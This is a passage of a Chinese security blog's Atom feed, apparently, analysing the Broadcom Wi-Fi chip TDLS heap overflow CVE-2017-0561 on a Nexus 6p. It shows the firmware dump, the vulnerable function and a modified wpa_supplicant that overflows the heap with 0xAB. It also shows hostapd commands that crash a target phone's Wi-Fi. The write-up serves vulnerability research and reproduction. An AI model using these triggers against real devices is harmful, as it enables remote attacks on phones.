-<p>2.启动过程如果出现“Interface wlan0 wasn’t started”错误，先运行下面2行命令<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo nmcli nm wifi off</div><div class="line">sudo rfkill unblock wlan</div></pre></td></tr></table></figure></p>
-<p>然后继续执行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo ./hostapd -B /etc/hostapd.conf</div></pre></td></tr></table></figure></p>
-<p>3.目标手机连上指定开启的wifi名称为“YourNetworkNameHere”的wifi，即可看到漏洞被触发，wifi重启。</p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>前面已经了解了漏洞的成因，和简单复现了漏洞。接下来我们要做的是利用漏洞做些事情。后续继续分析将详细给出exploit的编写方法。</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>1、Ubuntu上编译hostapd：<a href="http://blog.csdn.net/hnllc2012/article/details/49151137" rel="external nofollow noopener noreferrer" target="_blank">http://blog.csdn.net/hnllc2012/article/details/49151137</a><br>2、博客参考：<a href="http://boosterok.com/blog/broadpwn1/" rel="external nofollow noopener noreferrer" target="_blank">http://boosterok.com/blog/broadpwn1/</a></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;上一篇文章写过之后又修改了一部分内容，加了很多细节。不过还有一点没有详细说明，具体怎么定位到漏洞函数。这里再进行定位流程详细梳理。&lt;br&gt;1
-    
-    </summary>
-    
-      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="Poc" scheme="http://www.future-sec.com/tags/Poc/"/>
-    
-      <category term="BROADCOM WI-FI" scheme="http://www.future-sec.com/tags/BROADCOM-WI-FI/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>BROADCOM WI-FI芯片漏洞分析一</title>
-    <link href="http://www.future-sec.com/broadcom-wifi-1.html"/>
-    <id>http://www.future-sec.com/broadcom-wifi-1.html</id>
-    <published>2017-08-29T16:00:00.000Z</published>
-    <updated>2017-12-21T07:33:30.953Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Android Wi-Fi驱动一直是众多安全研究员关注的重点，Android Wi-Fi驱动中曾经被发现大量root提权漏洞。 但这些漏洞都是存在于WEXT(Wireless-Extensions)接口中的，WEXT是一种即将被淘汰的Wi-Fi配置接口。取而代之的是基于nl80211协议的cfg80211接口。本篇文章主要介绍了基于nl80211协议的cfg80211怎么触发Wi-Fi芯片中的漏洞。以及相关漏洞的定位和分析。</p>
-<h2 id="为什么研究Wi-Fi？"><a href="#为什么研究Wi-Fi？" class="headerlink" title="为什么研究Wi-Fi？"></a>为什么研究Wi-Fi？</h2><p>Wi-Fi的使用已经与生活密不可分，Wi-Fi安全问题也应该受到更大的重视。在最近的一次移动安全峰会上，有一个议题是关于Wi-Fi芯片漏洞远程代码执行的。借此，重点研究了一下Wi-Fi芯片漏洞。</p>
-<h2 id="读懂Poc需要哪些前提知识"><a href="#读懂Poc需要哪些前提知识" class="headerlink" title="读懂Poc需要哪些前提知识"></a>读懂Poc需要哪些前提知识</h2><h3 id="JNI"><a href="#JNI" class="headerlink" title="JNI"></a>JNI</h3><pre><code>poc 是jni语言编写的，那什么是jni呢?
-</code></pre><p>JNI全称为java native interface,Java本地开发接口,JNI是一个协议,这个协议可以用来沟通Java代码和本地的c/c++代码 让两者可以相互的调用<br>在poc的文件结构中我们可以看到一个jni文件都包含下面三个文件：<br>•    Android.mk文件是在使用NDK编译C代码时必须的文件。Android.mk文件中描述了哪些C文件将被编译且指明了如何编译。<br>•    Application.mk目的是描述在你的应用程序中所需要的模块(即静态库或动态库)。<br>•    Pwn.c是触发漏洞的测试代码。</p>
-<h3 id="Netlink-Protocol-Library-Suite-（libnl）"><a href="#Netlink-Protocol-Library-Suite-（libnl）" class="headerlink" title="Netlink Protocol Library Suite （libnl）"></a>Netlink Protocol Library Suite （libnl）</h3><p>主要用来套接字的处理、发送和接收数据、消息的构造和解析。</p>
-<h3 id="Netlink"><a href="#Netlink" class="headerlink" title="Netlink"></a>Netlink</h3><p>Netlink协议是基于套接字的进程间通信（IPC）机制，它可用于用户空间进程和内核之间或者用户空间进程之间的通信。Netlink 协议基于 BSD 套接字并使用 AF_NETLINK 地址簇。每一个 Netlink协议都有自己的协议号（比如：NETLINK_ROUTE，NETLINK_NETFILTER，等等）。<br>它的寻址方案是基于 32 位的端口号（之前被称为 PID），这个端口号用来唯一的标识每一个对等通信节点。<br>-nl_send_auto_complete()消息和数据的发送函数<br>poc中主要使用nl_send_auto_complete函数来发送数据，这个是libnl封装好的。最终还是调用nl_send_auto() 函数来发送数据。参考一个翻译的官方文档：<a href="http://blog.guorongfei.com/2015/01/27/libnl-translation-part4/" rel="external nofollow noopener noreferrer" target="_blank">http://blog.guorongfei.com/2015/01/27/libnl-translation-part4/</a><br>-nla_put()数据封装函数<br>nla_put() 函数以 nla_reserve()函数为基础，只不过它还接收一个指向包含属性载荷的缓冲区的指针。这个函数会自动把数据从缓冲区拷贝到消息中去。会利用嵌套属性进行数据包封装，属性的嵌套是通过在代码前后分别调用nla_nest_start() 和 nla_nest_end() 来完成的。<br>nla_nest_start() 函数会在消息中添加一个没有实际载荷的属性头部，在此之后添加的数据都会成为容器属性的载荷部分直到调用 nla_nest_end()为止，它的调用“关闭”了容器属性并校正它的载荷长度以包含所有的数据长度。</p>
-<h3 id="cfg80211-nl80211"><a href="#cfg80211-nl80211" class="headerlink" title="cfg80211/nl80211"></a>cfg80211/nl80211</h3><p>nl80211是供用户空间进程使用，操作利用cfg80211 API 开发无线网卡驱动。cfg80211是开发驱动的接口。</p>
-<h3 id="TDLS-协议"><a href="#TDLS-协议" class="headerlink" title="TDLS 协议"></a>TDLS 协议</h3><p>TDLS旨在提供一种不依赖AP的Wi-Fi网络上的对等通信方式。 TDLS是基于IEEE 802.11z标准。TDLS自动链接配置主要通过几个过程来完成<br>•    TDLS Discovery过程<br>TDLS Discovery过程不是必要选项。一个TDLS STA设备可以选择直接发起TDLS建立过程。 TDLS Discovery 过程由一部STA设备通过AP或Go(群组拥有者) 向另外一部STA设备发送一个TDLS Discovery请求帧开始。如果目标设备也兼容TDLS，它将直接向该发送设备回复TDLS Discovery 响应帧，并提供有关设备本身的能力信息。包括所有支持速率及信道。TDLS Discovery 过程除了提供目标STA确实支援TDLS的相关能力信息外，TDLS Discovery过程的帧交互亦可以用作AP与目标TDLS STA设备的相对信号强度的测量。发起的STA能够判断与目标STA间的直接连接是否有利于提供有效信息。通过对比分別由目标STA设备与AP设备收到的信号强度，发起的STA设备可以评估建立直接连接是否会比通过AP发送数据包更为有效。<br>•    TDLS Setup过程<br>TDLS Setup过程需要进行一系列的帧交换。发起设备首先发送一个TDLS传输请求，通过AP信道传输至目标设备。封装帧包括发送设备的性能信息。目标设备之后会回复TDLS Setup 建立响应，同样通过AP信道传送其性能信息，另外附加一个状态代码，表示接受或者拒绝该建立请求。如果接受Setup请求，发送设备将会通过AP传送一个TDLS 确认帧（Confirm Frame）。至此，两部设备之间开始进行直接通讯。<br>•    TDLS Teardown过程<br>发送方或接受方设备均可向另外一方直接发送TDLS拆解帧（Teardown Frame），而如果未处于讯号范围內，该帧则可以通过AP信道传输。</p>
-<h2 id="POC-的分析过程"><a href="#POC-的分析过程" class="headerlink" title="POC 的分析过程"></a>POC 的分析过程</h2><h3 id="NDK环境搭建"><a href="#NDK环境搭建" class="headerlink" title="NDK环境搭建"></a>NDK环境搭建</h3><p>网上有很多参考，这里就不再赘述。</p>
-<h3 id="编译POC"><a href="#编译POC" class="headerlink" title="编译POC"></a>编译POC</h3><p>在这次研究过程中，POC的编译过程花费了大量时间。主要是不了解libnl库的正确使用方法，然后找了很多资料都是安卓开发ndk的，没有怎么使用libnl库的。最后经过大量资料参考，终于找到了一种暂时可行的方法，在那篇博文中作者称目前android自身没有携带libnl库，所以如果用到libnl库就需要把libnl一起移植到安卓上。我们就根据他所描述的方法，从github上down下来了一份已经移植好的安卓平台的libnl库。<br>具体命令如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">git <span class="keyword">clone</span> https:<span class="comment">//github.com/dschuermann/libnl-3-android</span></div><div class="line">cd libnl<span class="number">-3</span>-android/lib</div><div class="line">cd ../android_toolchain</div><div class="line">gvim jni/Android.mk(前文有该文件的相关介绍)</div><div class="line">gvim jni/Applcation.mk (前文有该文件的相关介绍)</div></pre></td></tr></table></figure></p>
-<p>在Android.mk的最后部分加上这一段：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">include</span> $(CLEAR_VARS)  LOCAL_MODULE := pwn  LOCAL_SRC_FILES :=  $(call <span class="keyword">list</span>-all,$(LOCAL_PATH),pwn.c)  LOCAL_SHARED_LIBRARIES := nl<span class="number">-3</span> nl-genl<span class="number">-3</span>  <span class="keyword">include</span> $(BUILD_EXECUTABLE)</div></pre></td></tr></table></figure></p>
-<p>修改好之后将pwn.c文件拷贝到lib文件就可以编译了。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cd ../../android_toolchain</div><div class="line">ndk-build</div></pre></td></tr></table></figure></p>
-<p>编译好后将libs文件夹下的libnl-3.so，libnl-genl-3.so，pwn 利用adb命令将libs文件下的lib-3.so、lib-genl-3.so、pwn拷贝到已经root后的支持nl80211协议的测试机中，执行编译好的pwn就可以测试poc是否可用了。</p>
-<h3 id="测试POC"><a href="#测试POC" class="headerlink" title="测试POC"></a>测试POC</h3><p>分别在华为、小米、nexus 6p手机上进行了poc的测试。poc具体执行情况在小米手机上执行所有poc都是no such file or directory 。在华为手机上发送数据后的返回值为success。nexus手机测试结果也是success。 因为没有过wifi漏洞分析经验，不知道触发漏洞后正确的返回值应该是什么？所以接下来要透彻了解漏洞是否触发还需要大量的固件分析，漏洞定位，利用漏洞复现工作。</p>
-<h2 id="Wifi芯片代码分析"><a href="#Wifi芯片代码分析" class="headerlink" title="Wifi芯片代码分析"></a>Wifi芯片代码分析</h2><p>经过一系列的各种折腾，终于开始慢慢切入正题。分析的芯片是nexus 6p 6.0 版本。</p>
-<h3 id="怎么找到Wi-Fi固件？"><a href="#怎么找到Wi-Fi固件？" class="headerlink" title="怎么找到Wi-Fi固件？"></a>怎么找到Wi-Fi固件？</h3><p>要分析漏洞的成因，需要找到Wi-Fi芯片中与应用层通信部分代码。那接下来要怎么做才能将手机中的固件代码导出来呢？<br>第一步：我们需要了解Wi-Fi芯片在安卓系统内存中的加载位置。关于这个问题我们参考了Project Zero 的博客中分析的有关Wi-Fi芯片架构的知识，在Broadcom Wi-Fi芯片组相关的数据手册中，ARM内核具有用于保存固件代码的640KB ROM，以及用于数据处理（例如堆）和存储固件代码补丁的768KB RAM。</p>
-<p>RAM的位置可以通过读取主机驱动程序中的初始化代码，找到包含RAM内容的文件是上图所示fw_bcmdhd.bin文件（实际上，通过驱动程序的代码，我们找到了BCMDHD_FW_PATH配置，其用于表示驱动程序将内容上传到RAM的文件的位置。）</p>
-<p>ROM转存则可以通过Broadcom提供的一个非常强大的命令行实用程序dhdutil，可用于通过bcmdhd驱动程序与芯片进行交互。命令： ./dhdutil -i wlan0 membytes r 0x0 0xA0000 &gt; /sdcard/rom.bin</p>
-<h3 id="什么时候产生漏洞？"><a href="#什么时候产生漏洞？" class="headerlink" title="什么时候产生漏洞？"></a>什么时候产生漏洞？</h3><p>  利用上述方法转存出来bin文件之后，我们首先要了解bug产生的原因，才能下一步更好的定位漏洞位置。根据Project Zero提供的技巧，Wi-Fi管理帧以小的“标记”数据块（称为信息元素（IE））对大多数信息进行编码，传输的大部分信息也是利用IE进行编码的，所以这应该是我们逆向分析的一个好的出发点，有数据交互才可能出现漏洞。分析了漏洞利用可行性之后确定了在进行TDLS连接过程中会触发漏洞。有关TDLS前文中有描述。</p>
-<h3 id="定位固件中漏洞位置"><a href="#定位固件中漏洞位置" class="headerlink" title="定位固件中漏洞位置"></a>定位固件中漏洞位置</h3><p>根据Project Zero的提示在brcmsmac驱动程序可以找到Broadcom是使用一个函数从bcm_parse_tlvs帧提取IE。那接下来我们需要做的就是定位这个函数。搜索附近字符串提示我们首先定位到了bcm_parse_tlvs函数位置。<br><img src="/images/wifi1.png" alt="img"><br>然后通过交叉参考分析最终找到漏洞函数，要探索该漏洞的成因，首先要知道TDLS建立确认帧的函数处理流程。这个函数首先会执行一些验证，以确保请求是合法的。其查询内部数据结构，以确保确实正在与请求对等体建立TDLS连接。然后，其验证Link-ID IE（通过检查其编码的BSSID与当前网络的匹配），并且还验证32字节的发起者随机数（“Snonce”）值（通过将其与存储的初始随机数进行比较）。 建立对请求可能确实是合法的一定程度的置信度后，该函数开始调用一个内部帮助函数，任务是计算MIC并确保其与编码在帧中的一致。固件还包括该函数的名称(“wlc_tdls_cal_mic_chk”)。我们先看MIC通过编码在握手帧中的计算。<br><img src="/images/wifi2.png" alt="img"></p>
-<p>我们对固件逆向后也定位到了这个函数，如下图所示，反编译后伪代码中提示信息可以看到在标记的第二段代码进行了IE长度的校验，后续的IE就没有校验了。因此，将RSN-IE的长度设置为较大的值将导致Timeout Interval和Fast Transition IE越界复制，从而溢出缓冲区。<br><img src="/images/wifi3.png" alt="img"></p>
-<p>接下来看断开连接时mic计算。<br><img src="/images/wifi4.png" alt="img"></p>
-<p>伪代码中的在断开帧时没有对FT-IE进行溢出校验，如果构造好FT-IE数据就能触发溢出。<br><img src="/images/wifi5.png" alt="img"></p>
-<h2 id="漏洞触发场景复现"><a href="#漏洞触发场景复现" class="headerlink" title="漏洞触发场景复现"></a>漏洞触发场景复现</h2><p>知道了漏洞是怎么产生的，接下来就是测试漏洞是否按照我们预期的那样能够触发。<br>首先，准备了同时支持TDLS 协议的TL-WN722N无线网卡，跟nexus 6p。<br>第二步，为了测试漏洞，需要修改wpa_supplicant，以使我们能发送包含过大FTIE的TDLS断开帧。查看wpa_supplicant的代码可快速识别负责生成和发送断开帧的函数wpa_tdls_send_teardown。通过对该函数添加一些小的更改（绿色），我们应该能够在收到断开帧时触发溢出，导致超写25个字节的0xAB，修改后make编译一下。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">static</span> int wpa_tdls_send_teardown(struct wpa_sm *sm, <span class="keyword">const</span> u8 *addr, u16 reason_code)</div><div class="line">&#123;</div><div class="line">...</div><div class="line">ftie = (struct wpa_tdls_ftie *) pos;</div><div class="line">ftie-&gt;ie_type = WLAN_EID_FAST_BSS_TRANSITION;</div><div class="line">ftie-&gt;ie_len = <span class="number">255</span>;</div><div class="line">os_memset(pos + <span class="number">2</span>, <span class="number">0x00</span>, ftie-&gt;ie_len);</div><div class="line">os_memset(pos + ftie-&gt;ie_len + <span class="number">2</span> - <span class="number">0x19</span>, <span class="number">0xAB</span>, <span class="number">0x19</span>); <span class="comment">//Overflowing with 0xAB</span></div><div class="line"></div><div class="line">os_memcpy(ftie-&gt;Anonce, peer-&gt;rnonce, WPA_NONCE_LEN);</div><div class="line">os_memcpy(ftie-&gt;Snonce, peer-&gt;inonce, WPA_NONCE_LEN);</div><div class="line">pos += ftie-&gt;ie_len + <span class="number">2</span>;</div><div class="line">...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>第三步，执行TDLS命令去触发。这种情况是可以触发漏洞的，但是呢并没有明显现象的原因是Broadcom堆实现背后的逻辑。深入分析分配算符的逻辑，我们发现其非常简单，其是一个简单的“最适合”分配算符，其执行向前和向后合并，并保持一个空闲块单链表。当分配块时，从最适合空闲块（足够大的最小块）的末端（最高地址）对其进行切取。在断开连接后，空闲列表中的其中一个块的大小突然异常大。回想一下，由于分配算符使用“最适合”，这意味着只要存在其他足够大的空闲块，后续分配将不会被放置在此块中。这也意味着固件不会崩溃，实际上会继续正常运行。如果我们不可视化堆的状态，我们就根本无法确定发生了什么事。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">TDLS_DISCOVER – 发送“TDLS发现请求”帧并列出响应</div><div class="line">TDLS_SETUP - 建立与具有给定MAC地址的对等体的TDLS连接</div><div class="line">TDLS_TEARDOWN - 断开与具有给定MAC地址的对等体的TDLS连接</div></pre></td></tr></table></figure></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最近两周的分析过程中，确实遇到了很多问题，比如最开始编译poc的过程中对libnl库不会用，花了很长时间，最终的可行方法也不知道是不是最适合的。poc代码中使用了内核通信netlink协议，之前并没有接触过，这次也只是花了两天时间粗略看了poc中用到的函数。有关netlink相关知识后续还要深入学习。接下来编译测试poc之后，poc测试返回success但是并没有明显的触发漏洞现象。<br>基于此，参考了Project Zero的博客复现了CVE-2017-0561漏洞，整个过程从Wi-Fi芯片固件的知识开始了解，到怎么定位漏洞位置，怎么找到漏洞，怎么利用漏洞触发漏洞。这个过程也学到了很多知识。比如，Wi-Fi帧格式、TDLS协议、Broadcom堆实现、支持TDLS协议的wpa_supplicant开源工具等这些的理解。接下来要想利用漏洞就需要深入的去理解Wi-Fi的通信过程，netlink协议，以及动态的分析过程。</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>1、 <a href="http://bobao.360.cn/learning/detail/3742.html" rel="external nofollow noopener noreferrer" target="_blank">http://bobao.360.cn/learning/detail/3742.html</a><br>2、 <a href="https://googleprojectzero.blogspot.jp/2017/04/over-air-exploiting-broadcoms-wi-fi_4.html" rel="external nofollow noopener noreferrer" target="_blank">https://googleprojectzero.blogspot.jp/2017/04/over-air-exploiting-broadcoms-wi-fi_4.html</a></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Android Wi-Fi驱动一直是众多安全研究员关注的重点，Android Wi-Fi驱动中曾经被发现大量root提权漏洞。 但这些漏洞都
-    
-    </summary>
-    
-      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="Poc" scheme="http://www.future-sec.com/tags/Poc/"/>
-    
-      <category term="BROADCOM WI-FI" scheme="http://www.future-sec.com/tags/BROADCOM-WI-FI/"/>
     
   </entry>
   
